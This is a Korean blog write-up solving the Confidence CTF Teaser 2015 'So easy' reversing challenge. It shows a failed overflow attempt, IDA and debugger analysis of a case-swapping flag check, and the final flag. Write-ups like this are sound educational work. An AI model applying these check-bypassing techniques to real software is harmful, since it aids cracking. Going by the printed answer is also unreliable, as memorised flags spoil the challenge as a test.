&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;root@ubuntu:~&lt;span class=&quot;token comment&quot;&gt;# ./re_100_final&lt;/span&gt;
Please enter secret flag:
&lt;span class=&quot;token number&quot;&gt;1234&lt;/span&gt;
Nope&lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;1234를 입력해 보았는데, 이렇게 뜹니다. 그럼 오버플로우를 일으켜 보겠습니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;root@ubuntu:~&lt;span class=&quot;token comment&quot;&gt;# (python -c &apos;print &quot;A&quot;\*10000&apos;;cat) | ./re_100_final&lt;/span&gt;
Please enter secret flag:
Nope&lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;
close failed &lt;span class=&quot;token keyword&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;file&lt;/span&gt; object destructor
Error &lt;span class=&quot;token keyword&quot;&gt;in&lt;/span&gt; sys.excepthook:

Original excetion was:&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Segment fault가 뜨지 않고 종료가 되었습니다. 그럼 BOF는 통하지 않는듯 합니다.&lt;/p&gt;
&lt;p&gt;(지금 생각해보면 reversing문제인데 BOF를 시도한게 잘못된 생각같네요 ㅎㅎ..)&lt;/p&gt;
&lt;p&gt;이렇게 막힐때는 파일을 뜯어보아야 할 것 같습니다. IDA를 이용하여 파일을 열어보도록 하겠습니다.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/img/2015-05/Confidence-CTF-Teaser-2015-So-easy-100-reverse/img1.png&quot; alt=&quot;img1&quot;&gt;&lt;/p&gt;
&lt;p&gt;_puts를 call하는데 출력하는 문자열이 &lt;code class=&quot;language-text&quot;&gt;Please enter secret flag:&lt;/code&gt; 인것을 보아 이 부분이 시작되는 부분이 아닐까 생각되었습니다.&lt;/p&gt;
&lt;p&gt;그래서 이 함수를 분석해 보았습니다. 시작 부분에서 출력을 한 후, scanf를 이용하여 &lt;code class=&quot;language-text&quot;&gt;%31s&lt;/code&gt; 서식문자를 통해 입력을 받습니다. 이 서식문자를 통하여 입력 글자수를 제한하고 있네요.&lt;/p&gt;
&lt;p&gt;그럼 조금 더 아랫부분을 살펴보도록 하겠습니다.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/img/2015-05/Confidence-CTF-Teaser-2015-So-easy-100-reverse/img2.png&quot; alt=&quot;img2&quot;&gt;&lt;/p&gt;
&lt;p&gt;여기서 왼쪽 &lt;code class=&quot;language-text&quot;&gt;mov dword ptr [esp], offset s1&lt;/code&gt; 부분을 보게되면 &lt;code class=&quot;language-text&quot;&gt;dRGNs{tHISwASsOsIMPLE}&lt;/code&gt;이라는 문자열과, s2에 저장된 문자열을 strcmp를 이용하여 비교하는 부분을 볼 수 있습니다.&lt;/p&gt;
&lt;p&gt;strcmp를 이용하여 비교하는 부분을 보고, 해당 문자열을 직접 입력해 보았습니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;root@ubuntu:~&lt;span class=&quot;token comment&quot;&gt;# ./re_100_final&lt;/span&gt;
Please enter secret flag:
dRGNs&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;tHISwASsOsIMPLE&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
Nope&lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;하지만 역시 이렇게 쉬운 문제일 이유가 없습니다. 답이 아니므로, 이후 부분을 분석해 보도록 하겠습니다.&lt;/p&gt;
&lt;p&gt;우선 처음 부분이 끝나고 scanf리턴값과 1을 비교하여 값이 같을 경우 다음과 같은 부분이 실행되게 됩니다.&lt;/p&gt;
&lt;p&gt;만약 1이 아니면 무엇일까 따라가 보았습니다.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/img/2015-05/Confidence-CTF-Teaser-2015-So-easy-100-reverse/img3.png&quot; alt=&quot;img3&quot;&gt;&lt;/p&gt;
&lt;p&gt;이렇게 &lt;code class=&quot;language-text&quot;&gt;leave retn&lt;/code&gt;을 하여 함수를 종료하게 되었습니다.&lt;/p&gt;
&lt;p&gt;scanf의 리턴값이 1이라는 뜻은 정상적인 입력을 처리하였다는 뜻으로 알고 있는데, 이 뜻이 맞다고 생각해보면 정상적인 입력을 처리하였을 때 빨간색 선을 따라서 진행한다고 볼 수 있습니다.&lt;/p&gt;
&lt;p&gt;빨간 선을 따라가 보면&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;mov    dword ptr [esp+14h], offset s2
jmp    short loc_8048ABE&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;이 명령을 실행하게 됩니다. s2에 있는 값을 &lt;code class=&quot;language-text&quot;&gt;[esp+14h]&lt;/code&gt;에 저장합니다. 이후 &lt;strong&gt;loc_8048ABE&lt;/strong&gt;로 점프를 합니다.&lt;/p&gt;
&lt;p&gt;여기서 방금 저장한 &lt;code class=&quot;language-text&quot;&gt;[esp+14h]&lt;/code&gt;에 있는 값을 eax에 저장을 하고, &lt;code class=&quot;language-text&quot;&gt;byte ptr [eax]&lt;/code&gt;를 통하여 포인터 연산을 통하여 값에 접근합니다.&lt;/p&gt;
&lt;p&gt;그렇게 접근한 값을 이용하여&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;test    al, al
jnz    short loc_8048A67&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;명령을 실행하게 됩니다.&lt;/p&gt;
&lt;p&gt;이 명령을 통하여 eax에 있는 값이 0인지를 판별하게 됩니다. 만약 0이게 될 경우 왼쪽을, 0이 아닐 경우 오른쪽 명령을 실행하게 됩니다.&lt;/p&gt;
&lt;p&gt;오른쪽을 알아보기 전에 디버깅을 통하여 &lt;code class=&quot;language-text&quot;&gt;dRGNs{tHISwASsOsIMPLE}&lt;/code&gt;이 안되는데 그 부분을 따라 가도록 하겠습니다.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/img/2015-05/Confidence-CTF-Teaser-2015-So-easy-100-reverse/img4.png&quot; alt=&quot;img4&quot;&gt;&lt;/p&gt;
&lt;p&gt;strcmp를 실행하기 직전의 상황으로 s1의 데이터가 &lt;code class=&quot;language-text&quot;&gt;dRGNs{tHISwASsOsIMPLE}&lt;/code&gt;의 문자열이 저장된 공간이고, s2가 사용자로부터 입력받은 데이터 입니다.&lt;/p&gt;
&lt;p&gt;왼쪽 화면에서 체크가 되어있는 부분이 사용자로 입력을 받은 부분이 되겠습니다.&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;dRGNs{tHISwASsOsIMPLE}&lt;/code&gt; 로 입력하게 되었지만 실제 데이터 상에는 &lt;code class=&quot;language-text&quot;&gt;DrgnS{ThisWasSoSimple}&lt;/code&gt;이라는 문자열이 저장되어 있습니다.&lt;/p&gt;
&lt;p&gt;자세히 살펴보면 소문자는 대문자로 바뀌게 되었고, 대문자는 소문자로 바뀌게 되었습니다.&lt;/p&gt;
&lt;p&gt;그럼 이 특성을 이용하여 &lt;code class=&quot;language-text&quot;&gt;DrgnS{ThisWasSoSimple}&lt;/code&gt;을 입력해 보도록 하겠습니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;root@ubuntu:~&lt;span class=&quot;token comment&quot;&gt;# ./re_100_final&lt;/span&gt;
Please enter secret flag:
DrgnS&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;ThisWasSoSimple&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
Nope&lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;아직도 정답이 아니라고 나오네요. 그럼 오른쪽 부분을 마저 해석해 보았습니다.&lt;/p&gt;
&lt;p&gt;해석해 보았을때, 소문자를 대문자로, 대문자를 소문자로 바꾸는 명령이 전부였습니다.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/img/2015-05/Confidence-CTF-Teaser-2015-So-easy-100-reverse/img5.png&quot; alt=&quot;img5&quot;&gt;&lt;/p&gt;
&lt;p&gt;그래서 한 구간씩 검사를 하게 되었는데, printf함수를 지난 후에도 출력이 되지 않았습니다. 뭔가 이상함을 느끼고 출력을 하는 부분까지 스텝을 넘겨 보았습니다.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/img/2015-05/Confidence-CTF-Teaser-2015-So-easy-100-reverse/img6.png&quot; alt=&quot;img6&quot;&gt;&lt;/p&gt;
&lt;p&gt;이렇게 putchar 함수를 이용하여 출력을 하게 되었습니다.&lt;/p&gt;
&lt;p&gt;우선 printf함수를 지나가게 되어도 출력이 되지 않았다는 점을 생각하여 &lt;code class=&quot;language-text&quot;&gt;putchar&lt;/code&gt; 함수 주변에서 어떤 행위를 하지 않을까 생각을 가지게 되었습니다.&lt;/p&gt;
&lt;p&gt;putchar 함수를 사용하여 출력하는 부분이 어떠한 함수에 속하는지 살펴 보았는데,&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/img/2015-05/Confidence-CTF-Teaser-2015-So-easy-100-reverse/img7.png&quot; alt=&quot;img7&quot;&gt;&lt;/p&gt;
&lt;p&gt;왼쪽으로 갈 경우 &lt;code class=&quot;language-text&quot;&gt;Excellent Work!&lt;/code&gt;를 출력하고, 오른쪽으로 갈 경우 &lt;code class=&quot;language-text&quot;&gt;Nope!&lt;/code&gt;를 출력하게 됩니다.&lt;/p&gt;
&lt;p&gt;그럼 이 부분을 거치게 되어 왼쪽으로 갈 조건을 만족하게 되면 해결을 할 가능성이 있다고 생각됩니다.&lt;/p&gt;
&lt;p&gt;그럼 위에 조건을 판별하겠습니다.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/img/2015-05/Confidence-CTF-Teaser-2015-So-easy-100-reverse/img8.png&quot; alt=&quot;img8&quot;&gt;&lt;/p&gt;
&lt;p&gt;생각했던것 보다 짧네요. 마지막 &lt;code class=&quot;language-text&quot;&gt;loc_8048795:&lt;/code&gt; 이 부분을 기점으로 마지막 출력을 하게 됩니다. 그러면 이 부분에서 cmp를 사용하는 [ebp+var_15]의 값을 추적해 가면서 진행을 하여야 할 것 같습니다. &lt;code class=&quot;language-text&quot;&gt;loc_8048795:&lt;/code&gt;의 왼쪽 위에 있는 부분을 보게되면,&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;mov    [ebp+var_15], 0&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;을 사용하여 &lt;code class=&quot;language-text&quot;&gt;[ebp+var_15]&lt;/code&gt;에 값을 0을 넣어 줍니다. 마지막 cmp부분에서 &lt;code class=&quot;language-text&quot;&gt;[ebp+var_15]&lt;/code&gt;와 0을 cmp하게 되는데, 왼쪽위에 있는 부분을 지나게 될 경우 &lt;code class=&quot;language-text&quot;&gt;[ebp+var_15]&lt;/code&gt;의 값이 0이 되므로 jz는 참이 되게 됩니다.&lt;/p&gt;
&lt;p&gt;그러므로 오른쪽인 &lt;code class=&quot;language-text&quot;&gt;Nope!&lt;/code&gt;을 출력하게 됩니다. 그러면 왼쪽을 지나가지 않도록 만들어야 되겠습니다.&lt;/p&gt;
&lt;p&gt;왼쪽이 지나가지 않으려면 &lt;code class=&quot;language-text&quot;&gt;loc_804875F:&lt;/code&gt;의 마지막에 jz가 &lt;strong&gt;모두 참&lt;/strong&gt;이여야 합니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;jz    short loc_804878B&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;이 부분이 항상 참 이여야 하므로, test al, al의 zf가 1이 되어야 합니다.&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;test&lt;/code&gt;는 AND연산을 하게 되는데, 같은 값을 AND하게 되므로 al의 값이 0이여야 &lt;code class=&quot;language-text&quot;&gt;zf가 1&lt;/code&gt;이 됩니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;setnz al&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;이 부분의 결과값에 의하여 test의 결과가 결정되는데, 이 명령은 zf가 1이면 al에 0을, zf가 0이면 al에 1을 주게 됩니다. 그러므로 &lt;code class=&quot;language-text&quot;&gt;al&lt;/code&gt;의 값이 &lt;code class=&quot;language-text&quot;&gt;0&lt;/code&gt;이 되어야 jz가 만족합니다.&lt;/p&gt;
&lt;p&gt;zf를 결정하기 위해서는 cmp를 수행해야 하는데, &lt;code class=&quot;language-text&quot;&gt;edx&lt;/code&gt;와 &lt;code class=&quot;language-text&quot;&gt;eax&lt;/code&gt;의 값을 비교하게 됩니다. 두 값이 같게되면 zf는 1, 다르면 zf는 0을 가지게 됩니다.&lt;/p&gt;
&lt;p&gt;그럼 break point를 cmp부분에 주고 값을 비교해 보겠습니다.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/img/2015-05/Confidence-CTF-Teaser-2015-So-easy-100-reverse/img9.png&quot; alt=&quot;img9&quot;&gt;&lt;/p&gt;
&lt;p&gt;이러한 순서로 값을 비교하면 됩니다. ecx(문자 위치)에 따라서, &lt;code class=&quot;language-text&quot;&gt;0x64(d)&lt;/code&gt;, &lt;code class=&quot;language-text&quot;&gt;0x52(R)&lt;/code&gt;, &lt;code class=&quot;language-text&quot;&gt;0x47(G)&lt;/code&gt;, &lt;code class=&quot;language-text&quot;&gt;0x4e(N)&lt;/code&gt;, &lt;code class=&quot;language-text&quot;&gt;0x73(s)&lt;/code&gt;, &lt;code class=&quot;language-text&quot;&gt;0x7b({)&lt;/code&gt;까지는 일치하게 됩니다.&lt;/p&gt;
&lt;p&gt;하지만 ecx가 6일때는 값이 다르게 됩니다. &lt;code class=&quot;language-text&quot;&gt;0x74(t)&lt;/code&gt;와 &lt;code class=&quot;language-text&quot;&gt;0x6e(n)&lt;/code&gt;이 일치하지 않습니다. 앞의 문자를 보게되면 입력하게된 값임을 추측할 수 있습니다. 그리고 eax에 들어간 값은 입력된 값인 t를 나타내고 있습니다.&lt;/p&gt;
&lt;p&gt;그럼 t를 n으로 바꾸고 해주어야 합니다.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/img/2015-05/Confidence-CTF-Teaser-2015-So-easy-100-reverse/img10.png&quot; alt=&quot;img10&quot;&gt;&lt;/p&gt;
&lt;p&gt;n으로 입력을 해주게 되었는데, 값이 &lt;code class=&quot;language-text&quot;&gt;0x74&lt;/code&gt;에서 &lt;code class=&quot;language-text&quot;&gt;0x4e&lt;/code&gt;로 바뀌게 되었습니다. 이로써 입력한 값으로 변경됨을 알았습니다.&lt;/p&gt;
&lt;p&gt;하지만 &lt;code class=&quot;language-text&quot;&gt;0x6e(n)&lt;/code&gt;을 입력하였는데 &lt;code class=&quot;language-text&quot;&gt;0x4e(N)&lt;/code&gt;이 입력되었습니다. 이는 처음 분석하였던 부분인 대소문자를 변경해주는 부분에 의해서 변경이 이루어지게 됩니다.&lt;/p&gt;
&lt;p&gt;그러므로 입력된 값을 대소문자를 변경해 주어서 입력해야 됩니다.&lt;/p&gt;
&lt;p&gt;이러한 방법으로 한문자씩 변경을 해주게 되면 최종적인 값을 추출할 수 있습니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;root@ubuntu:~&lt;span class=&quot;token comment&quot;&gt;# ./re_100_final&lt;/span&gt;
Please enter secret flag:
DrgnS&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;NotEvenWarmedUp&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
Excellent Work&lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content:encoded></item></channel></rss>